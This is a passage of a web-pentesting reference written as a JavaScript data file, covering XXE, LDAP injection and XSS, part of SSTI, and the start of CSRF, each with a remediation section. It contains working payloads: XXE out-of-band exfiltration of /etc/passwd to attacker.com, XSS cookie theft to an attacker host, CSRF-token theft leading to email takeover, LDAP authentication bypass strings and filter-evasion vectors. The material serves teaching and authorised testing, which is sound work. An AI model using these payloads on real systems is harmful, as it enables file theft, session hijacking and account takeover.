              ["interactsh / Collaborator", "Blind confirmation via OOB callbacks where nothing reflects"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Server-side template injection (with labs)", url: "https://portswigger.net/web-security/server-side-template-injection" },
              { label: "PortSwigger research — SSTI: RCE for the modern web app", url: "https://portswigger.net/research/server-side-template-injection" },
              { label: "PayloadsAllTheThings — SSTI", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never build the template from user input. Pass user data as context variables to a static, pre-defined template so the engine treats it as inert data (render('hello.html', name=name), not render('Hi '+name)).",
              "Do not offer user-editable templates unless you must; if you do, use a genuinely logic-less engine (e.g. a strict Mustache/Handlebars config) that cannot access objects or call functions.",
              "If a sandbox is unavoidable, keep the engine and its sandbox fully patched, restrict the exposed object/filter set to the minimum, and treat the sandbox as defence-in-depth, not a guarantee.",
              "Validate and allow-list any input that legitimately selects a template (a fixed set of template names), and never let input choose an arbitrary template path.",
              "Run the app with least privilege and isolation so that even a successful escape is contained.",
              "Treat any confirmed SSTI as potential RCE; when testing, stop at a benign proof (7*7 or id) unless full exploitation is explicitly in scope."
            ]
          }
        ]
      },
      {
        id: "xxe",
        name: "XML External Entity (XXE)",
        severity: "High",
        ref: "https://portswigger.net/web-security/xxe",
        description: "An XML parser processes attacker-defined external entities, enabling file read, SSRF, and sometimes RCE.",
        brief: "XML External Entity injection arises when an application parses XML input with a parser that still permits Document Type Definitions (DTDs) and external entity resolution — behaviour that is on by default in many older parsers. XML lets a document define entities, which are like variables, and an external entity can point at a URI: a local file (file://), an internal HTTP endpoint (http://), or another DTD. When the parser expands the entity during parsing, it fetches that resource and either substitutes the content into the document (which may then be reflected) or, for blind cases, makes a request the attacker can observe out-of-band.\n\nThat single capability yields a wide impact surface. Pointing an entity at file:///etc/passwd reads local files (source code, config, private keys, /etc/shadow if privileged). Pointing it at http://169.254.169.254/ or an internal service turns the parser into an SSRF primitive — reaching cloud metadata to steal credentials, or internal-only APIs. Deeply nested entities (the 'Billion Laughs' attack) exhaust memory for denial of service. On specific stacks (e.g. PHP with the expect:// wrapper, or Java with certain configurations) XXE can even reach code execution.\n\nAny XML input is a candidate, and much XML is invisible: SOAP web services, SAML authentication assertions, RSS/XML-RPC, sitemap uploads, and — crucially — the many file formats that are XML underneath (SVG images, DOCX/XLSX/PPTX Office files). A document upload that is 'just an image' can carry an XXE payload if the server parses its embedded XML.",
        quickReference: [
          { label: "Classic file read", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>" },
          { label: "SSRF / cloud metadata", cmd: "<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">" },
          { label: "Blind OOB (external DTD)", cmd: "<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\"> %x;]>" },
          { label: "Where to inject", cmd: "Any XML body, SOAP, SAML, RSS, and SVG/DOCX/XLSX uploads" }
        ],
        sections: [
          {
            title: "Root Cause & Mechanism",
            type: "notes",
            items: [
              "XML parsers historically resolve DTDs and external entities by default; if the app does not explicitly disable them, attacker-defined entities are fetched and expanded during parse.",
              "A general entity (&x;) substitutes into the document body — used for in-band file read where the value is reflected. A parameter entity (%x;) is used inside the DTD itself — required for blind exfiltration because general entities cannot be used within the DTD's markup.",
              "The parser, not the app, performs the fetch, so it runs with the server's network position and privileges — which is exactly what makes XXE such a strong SSRF and file-read primitive.",
              "'Blind' XXE means the entity's content is never reflected; you recover data by having the malicious external DTD build a URL containing the file contents and requesting it from your server (out-of-band).",
              "Many stacks disable inline DOCTYPEs but still fetch external DTDs, or block file:// but allow http:// — so test SSRF even when file read is blocked."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Explicit XML APIs: any endpoint whose Content-Type is application/xml or text/xml, and any SOAP service.",
              "SAML single sign-on: the SAMLResponse is base64-encoded XML parsed server-side — a classic, high-value XXE (and signature-wrapping) target.",
              "File uploads that are XML underneath: .svg (parsed by image processors / rendered inline), .docx/.xlsx/.pptx (zipped XML), .xml sitemaps, .rss/.atom feeds, GPX/KML, SVG-in-PDF.",
              "APIs that accept both JSON and XML — flip the Content-Type to text/xml and add a body to reach the XML code path even where the UI only sends JSON.",
              "SVG rendered on the server (thumbnailing, PDF export) is a common blind-XXE sink even when there is no obvious XML field."
            ]
          },
          {
            title: "Step 1 — Confirm the Parser Resolves Entities",
            type: "commands",
            commands: [
              { label: "Harmless internal-entity echo", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY test \"XXE-WORKS\">]>\n<r>&test;</r>\n# if the response reflects XXE-WORKS, entity expansion is enabled" },
              { label: "OOB probe (works even when blind)", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM \"http://YOURID.oast.site\">]>\n<r>&x;</r>\n# a DNS/HTTP hit on your listener proves external fetch\n# (use interactsh / Burp Collaborator)" },
              { label: "Flip a JSON endpoint to XML", cmd: "# change Content-Type: application/json  ->  application/xml\n# and send an XML body; many frameworks parse whichever you send" }
            ]
          },
          {
            title: "Step 2 — Exploit: File Read & SSRF",
            type: "commands",
            commands: [
              { label: "In-band local file read", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root><data>&xxe;</data></root>\n# the file appears where &xxe; is reflected" },
              { label: "PHP wrapper for files with special chars", cmd: "# base64-wrap so XML-breaking characters survive:\n<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/config.php\">\n# then base64-decode the reflected value" },
              { label: "SSRF to internal services / cloud metadata", cmd: "<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]>\n<root>&xxe;</root>\n# also try http://localhost:port/ internal admin and Azure/GCP metadata (with header caveats)" },
              { label: "Windows targets", cmd: "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n# UNC path can also trigger NTLM auth to your host (credential capture)" }
            ]
          },
          {
            title: "Step 3 — Blind XXE (Out-of-Band Exfiltration)",
            type: "commands",
            commands: [
              { label: "Host this evil.dtd on your server", cmd: "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">\n%eval;\n%exfil;" },
              { label: "Send this payload to the target", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://attacker.com/evil.dtd\"> %x;]>\n<r>test</r>\n# the target fetches evil.dtd, reads the file, and calls back to you with it base64-encoded in the query string" },
              { label: "Error-based exfil (no outbound HTTP)", cmd: "# force the file content into a parser error message:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>\">\n%eval; %err;\n# the 'no such file' error contains /etc/passwd's contents" },
              { label: "Malicious SVG upload", cmd: "<?xml version=\"1.0\"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>\n<svg xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"20\">&xxe;</text></svg>\n# the rendered thumbnail shows the file contents" }
            ]
          },
          {
            title: "Variants",
            type: "table",
            columns: ["Variant", "Detail"],
            rows: [
              ["In-band read", "Entity contents are reflected directly in the response"],
              ["Blind OOB", "Exfiltrate via an external DTD that calls back to your server"],
              ["Error-based", "Provoke a parser error whose message embeds the file contents"],
              ["SSRF", "Point the entity at internal services / cloud metadata"],
              ["XInclude", "Inject <xi:include> when you control only part of the XML (no DOCTYPE)"],
              ["Billion Laughs (DoS)", "Exponentially nested entities exhaust memory"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find XML input (body / upload / SAML)", "Candidate parser"],
              ["2", "Confirm entity resolution (echo / OOB)", "External-entity processing verified"],
              ["3", "Read local files", "Source, config, keys, credentials"],
              ["4", "Pivot to SSRF -> cloud metadata", "Cloud IAM credential theft"],
              ["5", "Use stolen creds / reach internal APIs", "Wider environment compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite + Collaborator", "Manual injection and blind OOB detection/exfiltration"],
              ["XXEinjector", "Automated file retrieval and OOB exploitation"],
              ["oxml_xxe / docem", "Embed XXE payloads into Office/SVG documents"],
              ["interactsh", "Standalone OOB listener for blind confirmation"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — XXE injection (with labs)", url: "https://portswigger.net/web-security/xxe" },
              { label: "OWASP — XXE Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" },
              { label: "OWASP WSTG — Testing for XML Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection" },
              { label: "PayloadsAllTheThings — XXE Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable DTDs and external entity resolution in the parser — the definitive fix. Java: factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true). .NET: XmlReaderSettings.DtdProcessing = Prohibit. PHP (libxml < 2.9): libxml_disable_entity_loader(true). Python: use defusedxml instead of the stdlib parsers.",
              "Turn off external general and parameter entities and external DTD loading explicitly (setFeature external-general-entities / external-parameter-entities = false) as belt-and-braces.",
              "Prefer JSON or a hardened, DTD-free parser where XML is not strictly required; keep XML libraries patched, as safe defaults vary by version.",
              "Validate and sandbox uploaded XML-based files (SVG, Office documents) before any server-side parsing/rendering, and process images with libraries configured to ignore embedded XML.",
              "Apply least privilege to the app account and enforce egress filtering so a successful XXE reads little of value and cannot reach internal services or metadata endpoints.",
              "For SAML specifically, use a vetted library with entity resolution disabled and signature validation done correctly (see SAML Authentication Flaws)."
            ]
          }
        ]
      },
      {
        id: "ldap-injection",
        name: "LDAP Injection",
        severity: "High",
        ref: "https://owasp.org/www-community/attacks/LDAP_Injection",
        description: "Unsanitised input in an LDAP filter alters directory queries, enabling authentication bypass and information disclosure.",
        brief: "LDAP injection is the directory-service cousin of SQL injection. Applications authenticate users and look up people against an LDAP directory (Active Directory, OpenLDAP) by building a search filter — a parenthesised expression like (&(uid=INPUT)(password=INPUT)). When that filter is assembled by concatenating user input without escaping LDAP's special characters, the attacker can inject filter syntax and rewrite the query's meaning.\n\nLDAP filter syntax is prefix/Polish notation: & is AND, | is OR, ! is NOT, * is a wildcard, and clauses are wrapped in parentheses. So injecting * matches any value, and injecting )(...) closes the current clause and adds new conditions. The canonical result is authentication bypass — turning the login filter into one that always matches — but the same primitive enables directory enumeration (list users, groups, admins) and blind, character-by-character extraction of attributes (email, password hashes where stored, group membership) by varying a wildcard and observing which requests succeed.\n\nIt appears wherever an app queries a directory with string-built filters: SSO and login, corporate address books, 'find a user' features, and access-control lookups. Impact ranges from logging in as any user to harvesting the entire directory, and it is often overlooked because LDAP is less familiar than SQL.",
        quickReference: [
          { label: "Auth bypass (always-true)", cmd: "*      or      *)(uid=*))(|(uid=*" },
          { label: "Wildcard enumeration", cmd: "admin*   a*   ab*  (walk the alphabet per position)" },
          { label: "Blind attribute extraction", cmd: "admin)(mail=a*)   vary the pattern, watch the response" },
          { label: "Special chars to escape/abuse", cmd: "(  )  *  \\  /  NUL  &  |  !  =" }
        ],
        sections: [
          {
            title: "LDAP Filter Syntax & Root Cause",
            type: "notes",
            items: [
              "LDAP filters use prefix notation: (&(a=1)(b=2)) means a=1 AND b=2; (|(a=1)(b=2)) means OR; (!(a=1)) means NOT; (a=*) matches any value of a.",
              "The bug is string concatenation: code like (&(uid=\" + user + \")(userPassword=\" + pass + \")) lets input containing ) ( * & | change the filter structure.",
              "Injecting a bare * makes a clause match any value; injecting )(condition) closes the developer's clause early and adds attacker-chosen conditions.",
              "Authentication that SEARCHES with the password inside the filter (rather than doing a proper bind) is especially weak — a wildcard in the password field can match anyone.",
              "Because valid vs invalid filters change the response (results shown, login succeeds, or an error), attackers get a boolean oracle for blind extraction."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Login forms backed by LDAP/Active Directory (intranets, VPN portals, SSO).",
              "User/people search and corporate address-book lookups.",
              "'Forgot username', profile lookup, and group-membership checks.",
              "Any field whose value plausibly ends up in an LDAP filter — username, email, employee id, department.",
              "Error messages mentioning LDAP, an invalid filter, or a directory server confirm the back-end."
            ]
          },
          {
            title: "Step 1 — Detect the Injection",
            type: "commands",
            commands: [
              { label: "Wildcard probe", cmd: "# in a search or login field:\nuser=*            # returns everyone / logs in as the first match?\nuser=admin*       # partial match -> wildcard is honoured" },
              { label: "Break the filter", cmd: "# unbalanced parens/operators should cause an LDAP error or changed results:\nuser=*)(uid=*\nuser=)(cn=*\nuser=admin)(|(uid=*\n# an error or a different response = the input reaches the filter unescaped" },
              { label: "Boolean differential", cmd: "# compare a definitely-true vs definitely-false injected condition:\nuser=admin)(&(1=1)   # true-ish\nuser=admin)(&(1=0)   # false-ish\n# a response difference confirms injection and gives an oracle" }
            ]
          },
          {
            title: "Step 2 — Auth Bypass & Extraction",
            type: "commands",
            commands: [
              { label: "Authentication bypass", cmd: "# filter: (&(uid=INPUT)(userPassword=INPUT))\n# wildcard password matches any:\nuser=admin    pass=*\n# or inject an always-true clause and comment out the rest:\nuser=*)(uid=*))(|(uid=*    pass=anything\nuser=admin)(&)             # AND-true, ignore password clause" },
              { label: "Directory enumeration", cmd: "# where results are reflected, broaden the match:\nsearch=*)(objectClass=*)          # list many objects\nsearch=*)(|(objectClass=user)(objectClass=group))\n# list admins:\nsearch=*)(memberOf=cn=admins,...)" },
              { label: "Blind attribute extraction (walk the alphabet)", cmd: "# does admin's mail start with 'a'? then 'b'? etc.\nuser=admin)(mail=a*)     # response true/false\nuser=admin)(mail=ad*)    # narrow down each position\n# repeat per character to reconstruct mail, description, or hashes if readable" },
              { label: "Attribute presence / AD-specific", cmd: "user=admin)(userPassword=*)      # is the attribute present/readable?\n# Active Directory: sAMAccountName, memberOf, userAccountControl are useful targets" }
            ]
          },
          {
            title: "How the Filter Breaks",
            type: "table",
            columns: ["Input", "Effect"],
            rows: [
              ["*", "Wildcard — matches any value of the attribute"],
              [") (  and  (|", "Close the current clause and inject a new OR/AND condition"],
              ["*)(uid=*))(|(uid=*", "Classic break making the search always match (auth bypass)"],
              ["admin)(&)", "AND with an empty (true) clause, discarding the password check"],
              [")(mail=a*)", "Boolean oracle for blind character-by-character extraction"],
              ["No escaping", "Input flows straight into (&(uid=INPUT)(userPassword=INPUT))"]
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a directory-backed login/search", "Candidate LDAP filter"],
              ["2", "Wildcard / filter-break probe", "Injection confirmed"],
              ["3", "Force an always-true filter", "Authentication bypass"],
              ["4", "Broaden the filter", "Directory / group enumeration"],
              ["5", "Wildcard oracle per character", "Blind extraction of attributes & credentials"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite (Repeater/Intruder)", "Manual filter-break testing and automated wildcard extraction"],
              ["ldapsearch", "Validate directory behaviour and craft/verify filters directly"],
              ["custom scripts", "Automate the per-character wildcard blind-extraction walk"],
              ["ldapdomaindump / windapsearch", "Enumerate an AD directory once you have access"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "OWASP — LDAP Injection", url: "https://owasp.org/www-community/attacks/LDAP_Injection" },
              { label: "OWASP WSTG — Testing for LDAP Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection" },
              { label: "OWASP — LDAP Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html" },
              { label: "PayloadsAllTheThings — LDAP Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Escape all LDAP special characters ( ) * \\ / NUL and the DN specials using the framework's dedicated LDAP encoding routine (e.g. OWASP ESAPI encodeForLDAP/encodeForDN) before building any filter.",
              "Use parameterised LDAP APIs / safe filter builders (e.g. .NET SearchRequest with proper escaping, Java's Filter classes) rather than string concatenation.",
              "Authenticate with a proper bind operation: search for the user with an escaped filter to find their DN, then attempt a bind with that DN and the supplied password — never put the password into the search filter.",
              "Bind to the directory with a least-privilege service account, and never construct the bind DN from raw user input.",
              "Validate input against an allow-list where the format is known (e.g. usernames match ^[a-zA-Z0-9._-]+$), rejecting filter metacharacters outright.",
              "Restrict which attributes the query can return so a successful injection cannot read sensitive fields."
            ]
          }
        ]
      }
    ]
  },
    {
    category: "Cross-Site & Client-Side",
    vulns: [
      {
        id: "xss",
        name: "Cross-Site Scripting (XSS)",
        severity: "High",
        ref: "https://portswigger.net/web-security/cross-site-scripting",
        description: "Attacker-controlled script executes in another user's browser, stealing sessions and acting as the victim.",
        brief: "Cross-Site Scripting occurs when an application places untrusted data into a page (or into client-side JavaScript) without encoding it for the context it lands in, so the browser parses the attacker's data as executable script instead of inert text. The injected JavaScript then runs inside the victim's origin, with full access to everything that origin can do: reading non-HttpOnly cookies and tokens, making authenticated same-origin requests as the victim, reading the DOM, keylogging, phishing via injected UI, and rewriting the page.\n\nXSS comes in three delivery modes. Reflected XSS echoes the payload straight back from the request into the response, so it is delivered by luring the victim to a crafted link. Stored (persistent) XSS saves the payload server-side (a comment, profile field, filename, support ticket) and fires for every user who views it — the most dangerous because it needs no lure and often hits admins. DOM-based XSS never involves the server reflecting anything: client-side JavaScript reads a source it controls (location.hash, location.search, postMessage) and writes it into a dangerous sink (innerHTML, document.write, eval). A stored payload that fires somewhere you cannot see (an admin dashboard, a log viewer) is blind XSS, caught with an out-of-band callback.\n\nThe single most important concept is context: the same input is safe in one place and dangerous in another, and the payload that works depends entirely on where the reflection lands (HTML body, tag attribute, inside <script>, inside a URL, inside a CSS block). The universal fix is the same principle everywhere — encode on output for the exact context, and prefer safe sinks over dangerous ones. Impact runs from nuisance to full account takeover and, chained with CSRF or admin functionality, to site-wide compromise.",
        quickReference: [
          { label: "Reflected probe", cmd: "<script>alert(document.domain)</script>   \"><img src=x onerror=alert(1)>" },
          { label: "Attribute / string break-out", cmd: "\"><svg onload=alert(1)>     ';alert(1)//     '-alert(1)-'" },
          { label: "No-script / filtered vectors", cmd: "<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <details open ontoggle=alert(1)>" },
          { label: "Session theft (concept)", cmd: "<script>new Image().src='//atk/?c='+document.cookie</script>" }
        ],
        sections: [
          {
            title: "Root Cause & Mechanism",
            type: "notes",
            items: [
              "The browser decides whether bytes are code or content based on where they sit in the document. XSS happens when attacker data crosses from a data position into a code position because the app failed to encode it for that spot.",
              "Correct defence is context-aware output encoding: HTML-entity-encode in HTML text, attribute-encode (and quote) in attributes, JavaScript-string-encode inside <script>, URL-encode in URL components, and CSS-encode in style. One encoding does not fit all contexts.",
              "DOM XSS is a client-side variant: no server encoding can fix it because the unsafe write happens in the browser — it is fixed by using safe DOM APIs (textContent, setAttribute) instead of sinks (innerHTML, document.write, eval, setTimeout(string)).",
              "HttpOnly stops script reading a cookie but does NOT stop XSS — the attacker can still ride the session with same-origin fetch/XHR, so HttpOnly limits one impact, not the vulnerability.",
              "mXSS (mutation XSS) exploits the browser re-parsing sanitised HTML after DOM insertion, turning inert markup into live script — which is why home-grown sanitisers fail and DOMPurify exists."
            ]
          },
          {
            title: "Where to Look",
            type: "notes",
            items: [
              "Every reflected input: search boxes, error messages, query parameters echoed into the page, and 'you searched for X' banners (reflected).",
              "Every stored/displayed field: comments, usernames and display names, profile bios, addresses, message bodies, filenames of uploads, support tickets, and anything an admin later views (stored / blind).",
              "Client-side sinks: grep the JS for innerHTML, outerHTML, document.write, insertAdjacentHTML, eval, Function(), setTimeout/setInterval with strings, jQuery .html()/.append(), and location assignments fed from location.hash/search or postMessage (DOM).",
              "Non-obvious sinks: SVG/HTML file uploads served inline, Markdown renderers, PDF/HTML export, custom email templates, and JSON reflected into a <script> block.",
              "Header/less-common reflections: Referer, User-Agent, and custom headers echoed into error or admin pages."
            ]
          },
          {
            title: "Step 1 — Find the Reflection & Its Context",
            type: "commands",
            commands: [
              { label: "Inject a unique marker", cmd: "# a distinctive, harmless token you can grep for in the response and DOM\nq=xz9k7qmarker\n# note EVERY place it appears and HOW it is encoded there" },
              { label: "Classify the context", cmd: "HTML body        <div>MARKER</div>          -> inject a tag\nAttribute (quoted) value=\"MARKER\"           -> close the quote/tag: \">\nAttribute (unquoted) value=MARKER           -> add an event handler with a space\nInside <script>  var x='MARKER';            -> break the string: ';payload//\nURL / href       href=\"MARKER\"              -> javascript: scheme\nCSS              style=\"...MARKER...\"        -> expression / url() vectors" },
              { label: "See what survives encoding", cmd: "# submit  <>\"'`  and check which come back raw vs entity-encoded\n# raw < and > in HTML body = tag injection likely works\n# only \" encoded but ' raw in a single-quoted attr = still exploitable" },
              { label: "Reflected vs DOM", cmd: "# if the marker is in the raw HTTP response -> server-side reflection\n# if it appears only after JS runs (view source clean, DOM dirty) -> DOM XSS" }
            ]
          },
          {
            title: "Step 2 — Payloads by Context",
            type: "table",
            columns: ["Context", "Payload"],
            rows: [
              ["HTML body", "<svg onload=alert(document.domain)>  /  <img src=x onerror=alert(1)>"],
              ["Quoted attribute", "\"><svg onload=alert(1)>  (break out first)"],
              ["Unquoted attribute", "x onmouseover=alert(1)  (a space starts a new attribute)"],
              ["Inside <script> string", "';alert(1)//   or   </script><svg onload=alert(1)>"],
              ["href / src (URL)", "javascript:alert(document.domain)"],
              ["Event-handler attribute", "already in JS context: alert(1)  (may need HTML-decode)"],
              ["JS template / JSON in script", "</script> break-out, or Unicode/backtick escapes"],
              ["AngularJS sandbox (ng-app)", "{{constructor.constructor('alert(1)')()}}"]
            ]
          },
          {
            title: "Step 3 — Filter & WAF Bypass",
            type: "commands",
            commands: [
              { label: "When <script> is blocked", cmd: "# event handlers on other tags need no <script>:\n<svg onload=alert(1)>\n<img src=x onerror=alert(1)>\n<body onpageshow=alert(1)>\n<details open ontoggle=alert(1)>\n<input autofocus onfocus=alert(1)>" },
              { label: "When parentheses / quotes are filtered", cmd: "# backticks call functions:  alert`1`\n# no quotes: use String.fromCharCode or /regex/.source or template literals\n# throw/onerror trick:  <img src=x onerror=alert`1`>\nonerror=alert;throw 1                       # arg-less call via throw" },
              { label: "Case, encoding & obfuscation", cmd: "<sCrIpT>alert(1)</sCrIpT>                  # tags are case-insensitive\n# HTML entities in attributes are decoded before JS runs:\n<a href=\"javas&#99;ript:alert(1)\">\n# double URL-encoding / overlong UTF-8 to slip a WAF that decodes late\n# eval(atob('...')) to hide the payload body" },
              { label: "Break naive sanitisers", cmd: "# incomplete tag stripping — nest so removal creates a live tag:\n<scr<script>ipt>alert(1)</scr</script>ipt>\n<<script>alert(1)//<</script>\n# mXSS: markup that mutates into script when re-parsed (use DOMPurify to defend)" }
            ]
          },
          {
            title: "DOM XSS — Sources & Sinks",
            type: "table",
            columns: ["Sources (attacker-controlled)", "Dangerous sinks (execution)"],
            rows: [
              ["location.hash / .search / .href", "element.innerHTML / outerHTML"],
              ["document.referrer", "document.write / writeln"],
              ["window.name", "eval / Function / setTimeout(string)"],
              ["postMessage event.data", "element.insertAdjacentHTML"],
              ["localStorage / sessionStorage", "jQuery $().html() / $($input)"],
              ["URL fragment params", "location = / location.href = (javascript:)"]
            ]
          },
          {
            title: "Step 4 — Weaponise",
            type: "commands",
            commands: [
              { label: "Steal a non-HttpOnly cookie", cmd: "<script>new Image().src='//attacker.com/?c='+encodeURIComponent(document.cookie)</script>\n<script>fetch('//attacker.com/?c='+document.cookie)</script>" },
              { label: "Ride the session (works with HttpOnly)", cmd: "// perform an authenticated action as the victim, same-origin:\n<script>fetch('/account/email',{method:'POST',credentials:'include',\n  headers:{'Content-Type':'application/x-www-form-urlencoded'},\n  body:'email=attacker@evil.com'})</script>\n// often chained: change email -> trigger password reset -> takeover" },
              { label: "Steal a CSRF token then submit", cmd: "<script>fetch('/account').then(r=>r.text()).then(h=>{\n  const t=h.match(/csrf\" value=\"([^\"]+)/)[1];\n  fetch('/account/email',{method:'POST',credentials:'include',\n    body:'csrf='+t+'&email=attacker@evil.com'});})</script>" },
              { label: "Blind XSS beacon", cmd: "# plant where an admin will render it (support ticket, user-agent, feedback):\n\"><script src=//xss.report/c/yourid></script>\n# the callback tells you where it fired, with cookies/DOM/screenshot" }
            ]
          },
          {
            title: "Bypassing CSP",
            type: "notes",
            items: [
              "A CSP only mitigates XSS — a weak policy still allows it. Look for unsafe-inline (inline handlers/scripts run), unsafe-eval (eval works), or a wildcard/overbroad script-src.",
              "Allow-listed CDNs that host JSONP endpoints or vulnerable libraries (AngularJS, older jQuery) let you load approved-but-abusable script.",
              "'strict-dynamic' with a leaked or predictable nonce, or a nonce reused across responses, can be abused.",
              "Missing base-uri lets a <base> tag hijack relative script loads; missing object-src allows plugin vectors.",
              "Report the CSP weakness alongside the XSS — a robust policy (nonce/hash-based, no unsafe-inline) is a key part of the fix."
            ]
          },
          {
            title: "Impact & Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Reflect a marker, identify the context", "Injection point + the payload it needs"],
              ["2", "Craft a context-appropriate payload, bypass filters", "Script executes in the browser"],
              ["3", "Deliver (crafted link, or store it)", "Runs in the victim's authenticated session"],
              ["4", "Steal session / perform actions / read data", "Session hijack, account takeover"],
              ["5", "Target an admin (stored/blind)", "Privileged actions, site-wide compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Burp Suite + DOM Invader", "Manual probing, context analysis, automated DOM-XSS source/sink tracing"],
              ["dalfox", "Fast automated XSS scanning, parameter analysis, and payload generation"],
              ["XSS Hunter / ezXSS", "Blind XSS callbacks with DOM, cookies, and screenshots"],
              ["kxss / Gxss", "Find reflected parameters and which special chars survive"],
              ["DOMPurify (defence)", "Reference client-side sanitiser for safe rich HTML"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "PortSwigger — Cross-site scripting (with labs)", url: "https://portswigger.net/web-security/cross-site-scripting" },
              { label: "OWASP — XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
              { label: "OWASP — DOM-based XSS Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" },
              { label: "PortSwigger — XSS cheat sheet (interactive)", url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" },
              { label: "PayloadsAllTheThings — XSS Injection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Context-aware output encoding is the core fix: HTML-encode in HTML text, attribute-encode inside quoted attributes, JavaScript-encode inside scripts, URL-encode in URL parameters. Use your framework's auto-escaping (React JSX, Angular, Razor, Thymeleaf) and never disable it or use raw/bypass APIs (dangerouslySetInnerHTML, |safe, [innerHTML]) on untrusted data.",
              "Eliminate dangerous DOM sinks: use textContent/innerText and setAttribute instead of innerHTML/document.write/eval; if you must render rich HTML, sanitise it with DOMPurify and nothing home-grown.",
              "Deploy a strict, nonce- or hash-based Content-Security-Policy with no unsafe-inline and no unsafe-eval as defence-in-depth so a single missed encoding is not instantly exploitable.",
              "Set HttpOnly and SameSite on session cookies — HttpOnly stops cookie theft (not the XSS itself) and SameSite blunts cross-site delivery of reflected payloads.",
              "For file uploads that could be HTML/SVG, serve them from a separate origin with Content-Disposition: attachment and a non-HTML content type so they cannot execute in the app's origin.",
              "Validate input on the way in as defence-in-depth, but never rely on input filtering alone — output encoding for the correct context is what actually prevents XSS."
            ]
          }
        ]
      },
      {
        id: "csrf",
        name: "Cross-Site Request Forgery (CSRF)",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/csrf",
        description: "A malicious site causes the victim's browser to send an authenticated state-changing request they never intended.",
        brief: "CSRF abuses the browser's habit of attaching cookies to every request to a site, regardless of who initiated it. If a state-changing action relies only on the session cookie for authorization, an attacker can host a page that silently submits that request from the victim's authenticated browser — changing their email, password, or settings.\n\nImpact: account takeover and unwanted state changes performed as the victim. It requires no XSS and no credential theft; it simply rides the victim's existing session. The defence is an unpredictable, per-request token a cross-site attacker cannot know.",
        quickReference: [
          { label: "Auto-submitting form (concept)", cmd: "<form action=//target/change-email method=POST>\n <input name=email value=attacker@evil>\n</form><script>document.forms[0].submit()</script>" },
          { label: "Test: remove the token", cmd: "Strip the CSRF token/param — if the action still succeeds, it's vulnerable" },
          { label: "Test: swap the token", cmd: "Use another user's/session's token — if accepted, it isn't bound to the session" },
          { label: "Check", cmd: "Is the action protected only by a cookie? Is SameSite set? Is the token validated?" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
